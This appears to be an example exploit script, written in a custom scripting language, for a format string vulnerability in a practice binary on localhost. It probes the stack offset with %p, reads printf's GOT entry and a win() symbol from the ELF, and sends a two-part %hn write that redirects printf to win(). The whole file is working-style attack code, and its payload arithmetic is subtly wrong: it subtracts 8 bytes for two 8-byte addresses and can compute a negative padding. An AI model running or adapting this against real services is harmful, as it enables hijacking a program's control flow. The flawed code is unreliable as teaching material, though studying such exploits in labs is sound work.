# Format String Attack
# Demonstrates arbitrary write using format string vulnerability

print("[*] Format String Exploit")
print("============================================================")

let target = "127.0.0.1:8888"
let binary = "./format_string_vuln"  # Compile from format_string_vuln.c in examples/

print("[+] Target: " + target)
print("[+] Binary: " + binary)

# Step 1: Find format string offset
print("\n[*] Step 1: Finding format string offset...")
let test_input = "AAAA" + "%p " * 20
let session = connect_tcp(target)
send(session, test_input)
let response = recv(session, 1024)

# Parse response to find AAAA (0x41414141)
# In real scenario, automate this parsing
let offset = 6
print("    [!] Format string offset found: " + str(offset))

# Step 2: Identify target addresses
print("\n[*] Step 2: Analyzing binary...")
let elf = parse_elf(binary)
let got_entry = elf["got"]["printf"]  # Target: GOT entry for printf
let win_function = elf["symbols"]["win"]  # Goal: call win()

print("    printf@GOT: " + hex(got_entry))
print("    win() @ " + hex(win_function))

# Step 3: Build format string payload
print("\n[*] Step 3: Building format string payload...")

# Split target address into 2-byte writes (for efficiency)
let addr_low = got_entry
let addr_high = got_entry + 2

let value_low = win_function & 0xffff
let value_high = (win_function >> 16) & 0xffff

print("    Writing " + hex(win_function) + " to " + hex(got_entry))
print("    Low word: " + hex(value_low) + " -> " + hex(addr_low))
print("    High word: " + hex(value_high) + " -> " + hex(addr_high))

# Format string payload:
# <addr_low><addr_high>%<value_low>c%<offset>$hn%<diff>c%<offset+1>$hn
let padding_low = value_low - 8  # Subtract address lengths
let padding_high = value_high - value_low

let payload = p64(addr_low) + p64(addr_high)
payload = payload + "%" + str(padding_low) + "c"
payload = payload + "%" + str(offset) + "$hn"
payload = payload + "%" + str(padding_high) + "c"  
payload = payload + "%" + str(offset + 1) + "$hn"

# Step 4: Send exploit
print("\n[*] Step 4: Sending format string exploit...")
let session2 = connect_tcp(target)
send(session2, payload)
print("[+] Exploit sent! printf@GOT now points to win()")

# Step 5: Trigger overwritten function
print("\n[*] Step 5: Triggering win()...")
send(session2, "trigger\n")
let result = recv(session2, 1024)
print("[+] Response: " + result)

print("\n[+] Format string exploit completed!")
